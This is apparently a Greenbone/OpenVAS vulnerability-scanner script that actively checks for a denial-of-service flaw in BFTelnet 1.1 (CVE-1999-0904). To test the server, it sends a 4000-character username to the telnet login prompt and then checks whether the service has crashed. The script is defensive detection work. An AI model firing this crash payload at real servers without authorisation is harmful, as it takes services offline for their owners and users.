if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.146617" );
	script_version( "2021-09-02T12:48:39+0000" );
	script_tag( name: "last_modification", value: "2021-09-02 12:48:39 +0000 (Thu, 02 Sep 2021)" );
	script_tag( name: "creation_date", value: "2021-09-02 12:08:47 +0000 (Thu, 02 Sep 2021)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-1999-0904" );
	script_tag( name: "qod_type", value: "remote_probe" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "BFTelnet <= 1.1 DoS Vulnerability - Active Check" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2021 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "telnetserver_detect_type_nd_version.sc", "os_detection.sc" );
	script_mandatory_keys( "Host/runs_windows" );
	script_require_ports( "Services/telnet", 23 );
	script_tag( name: "summary", value: "BFTelnet is prone to a denial of service (DoS) vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted LOGIN sequence and checks if the service is still alive." );
	script_tag( name: "insight", value: "A buffer overflow in BFTelnet allows remote attackers to cause
  a DoS via a long username." );
	script_tag( name: "affected", value: "BFTelnet version 1.1 and probably prior." );
	script_tag( name: "solution", value: "Update to the latest available version." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/771" );
	exit( 0 );
}
require("port_service_func.inc.sc");
require("telnet_func.inc.sc");
port = telnet_get_port( default: 23 );
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
banner = telnet_negotiate( socket: soc );
if(!banner || !ContainsString( banner, "Login:" )){
	close( soc );
	exit( 0 );
}
send( socket: soc, data: crap( length: 4000 ) + "\r\n" );
close( soc );
for(i = 0;i < 3;i++){
	soc = open_sock_tcp( port );
	if(soc){
		close( soc );
		exit( 0 );
	}
}
security_message( port: port );
exit( 0 );

